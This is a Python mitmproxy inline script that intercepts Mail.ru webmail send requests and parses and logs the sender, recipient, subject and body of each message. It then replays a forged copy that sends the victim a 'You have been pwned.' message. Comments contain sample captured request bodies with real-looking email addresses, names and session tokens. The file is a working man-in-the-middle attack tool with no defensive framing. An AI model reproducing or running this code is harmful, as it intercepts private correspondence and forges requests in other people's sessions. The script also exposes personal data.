import logging
import time
import cStringIO
from PIL import Image
from libmproxy.protocol.http import decoded
import re
import urllib


class Mail_data:
    def __init__(self):
        self.mail = []

    def get_email(self, string):
        # Mail.ru
#        logging.debug("STR")
#        logging.debug(string)
        string = urllib.unquote(string).decode('utf-8')

#	m = re.match(r"(?P<Start>[\w\W]*)&To=(?P<To>[^&]*)&(?P<Middle>[\w\W]*)&Subject=(?P<Subject>[^&]*)&Body=(?P<Body>[^&]*)&(?P<End>[\w\W]*)&x-email=(?P<From>[^&]*)", string)
        m = re.match(r"(?P<Start>[\w\W]*)&x-email=(?P<From>[^&]*)&(?P<Middle>[\w\W]*)&To=(?P<To>[^&]*)&(?P<Middle2>[\w\W]*)&Subject=(?P<Subject>[^&]*)&Body=(?P<Body>[^&]*)&(?P<End>[\w\W]*)", string)
        match = False
        if (m):
            match = True
            self.mail.append(["mail","From: " + m.group('From'),"To: " + m.group('To'), "Subj: "+m.group('Subject'), m.group('Body')])
            logging.debug(str(self.mail[len(self.mail)-1]))
            #Pwning
#            string2 = m.group('Start')+"&To="+m.group('From')+"&"+m.group('Middle')+"&Subject="+m.group('Subject')+"&Body="+"You have been pwned."+"&"+m.group('End')+"&x-email="+m.group('From') 
            string2 = m.group('Start')+"&x-email="+m.group('From')+"&"+m.group('Middle')+"&To="+m.group('From')+"&"+m.group('Middle2')+"&Subject="+m.group('Subject')+"&Body="+"You have been pwned."+"&"+m.group('End') 

#            logging.debug("STR2")
#            logging.debug(str(string2))
            return (match,str(string2))
            
#old
#message=P579I38l&old_charset=utf-8&template_id=&HTMLMessage=1&draft_msg=&re_msg=&fwd_msg=&text=&direction=re&orfo=rus&RealName=0&attached_ids=&files_ids=&To=%22gusarov.aa%22+%3Cgusarov.aa%40gmail.com%3E&CC=&BCC=&Priority=0&Subject=Test&Body=Testmessage%3Cbr%3E--+%3Cbr%3E%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B5%D0%B9+%D0%93%D1%83%D1%81%D0%B0%D1%80%D0%BE%D0%B2&security_image_word=&token=167699978529441869162194510557524567120%3A5347457f71610901190504000f0a080c050c06010c0d03040d000d0002000000040200090c0d060503030001020006071850405f674403&form_sign=245cb916210c3f0eed21a5f778a058da&form_token=5347457f71610901190606025a51080404060203560a5105505350030553045f07000958090d0954501646525b4559445e&x-email=_microsoft_%40list.ru
#new
#ajax_call=1&x-email=toha-m%40list.ru&tarball=e.mail.ru-f-alpha-514-46958-en-s.tugovikov-1447784184.tgz&tab-time=1448031234&files_ids=&actionId=&text=&direction=re&orfo=rus&form_sign=9040d82212a4cfe179acee180bbbad67&form_token=65660a7f40610a47190d02030957090700050152015a515004010d50575754080807535b5b595506061654475c6e4206&files_id=&cloud_files_ids=%5B%5D&cloud_files_links=&message=EXhDTGInrMn7P6hEtLnFYBw1JA8UDtNF&old_charset=utf-8&template_id=&HTMLMessage=1&draft_msg=&re_msg=&fwd_msg=&attached_ids=&RealName=0&To=gusarov.aa%20%3Cgusarov.aa%40gmail.com%3E&CC=&BCC=&Subject=aaaaaaaaaaaaaaaaaaaaaaaaaaaa&Body=%3Cbr%3Ebbbbbbbbbbbbbbbbbbbbbbbbbbb%3Cbr%3E%3Cbr%3E--%20%3Cbr%3E%D0%90%D0%BD%D1%82%D0%BE%D0%BD%20%D0%9C%D0%B8%D1%82%D1%80%D0%BE%D1%85%D0%B8%D0%BD&security_image_word=&EditorFlags=0&SocialBitmask=0&EditContacts=


    def __repr__(self):
        s = '0\n'
        return s

mail_db = Mail_data()

def request(context, flow):
    try:
        f = context.duplicate_flow(flow)
        with decoded(flow.request):  # automatically decode gzipped responses.
            replay, new_content = mail_db.get_email(str(flow.request.content))
        if replay:
            f.request.content = str(new_content)
            context.replay_request(f)        

    except Exception as e:
#        logging.debug(e)
        pass
def start (context, argv):
    logging.basicConfig(filename="log.log",level=logging.DEBUG)
    logging.debug("============================================\n")
    logging.debug(time.time())
    logging.debug("Startup:\n")
    context.log("start")


'''
def clientconnect(context, root_layer):
    logging.debug("Client connect:\n")
'''
